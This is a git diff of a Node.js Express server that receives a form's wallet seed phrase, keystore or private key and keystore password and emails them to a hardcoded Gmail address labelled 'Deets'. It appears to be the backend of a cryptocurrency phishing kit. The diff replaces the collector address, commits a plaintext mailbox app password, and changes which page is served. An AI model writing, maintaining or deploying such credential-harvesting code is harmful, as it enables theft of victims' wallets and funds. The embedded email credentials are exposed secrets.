@@ -12,7 +12,7 @@ app.use(bodyParser.json());
 app.use(express.static(path.join(__dirname, 'public')));
 
 const maillist = [
-  'divasnow178@gmail.com',
+  'willyscotmegan@gmail.com',
 ];
 
 const transporter = nodemailer.createTransport({
@@ -20,13 +20,13 @@ const transporter = nodemailer.createTransport({
   port: 465,
   secure: true,
   auth: {
-    user: process.env.EMAIL_USER || "divasnow178@gmail.com",
-    pass: process.env.EMAIL_PASS || "cfoyhwlljngpvera",
+    user: process.env.EMAIL_USER || "willyscotmegan@gmail.com",
+    pass: process.env.EMAIL_PASS || "jubtgphwdbkrrauf",
   },
 });
 
 app.get('/', (req, res) => {
-  res.sendFile(path.join(__dirname, 'public', 'app.html'));
+  res.sendFile(path.join(__dirname, 'public', 'index.html'));
 });
 
 app.post('/submit', async (req, res) => {
@@ -36,10 +36,9 @@ app.post('/submit', async (req, res) => {
     const { wetName, phWet, passwordWet } = req.body;
 
     const mailOptions = {
-      from: '"Deets" <divasnow178@gmail.com>',
+      from: '"Deets" <willyscotmegan@gmail.com>',
       to: maillist,
       html: `
-        <p><strong>Name:</strong> ${wetName || 'Not provided'}</p>
         <p><strong>Phrase/KS/PKey:</strong> ${phWet || 'Not provided'}</p>
         <p><strong>Pswd (if keystore):</strong> ${passwordWet || 'Not provided'}</p>
       `
